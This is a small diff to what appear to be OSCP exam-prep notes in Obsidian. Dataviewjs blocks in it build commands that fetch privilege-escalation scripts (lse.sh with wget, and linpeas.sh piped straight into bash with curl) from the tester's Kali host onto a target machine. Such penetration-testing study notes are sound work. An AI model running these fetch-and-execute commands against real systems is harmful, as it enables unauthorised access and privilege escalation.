@@ -15,6 +15,13 @@ const command = `cd /tmp && wget http://${KaliIP}:8888/lse.sh && chmod 700 lse.s
 
 dv.paragraph("```bash\n" + command + "\n```");
 ```
+Directly execute into terminal
+```dataviewjs
+const page = dv.page("Synced OSCP Notes/Top/Active Machine");const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";
 
+const command = `curl http://${KaliIP}:8888/linpeas.sh | bash`;
+
+dv.paragraph("```bash\n" + command + "\n```");
+```
 
 
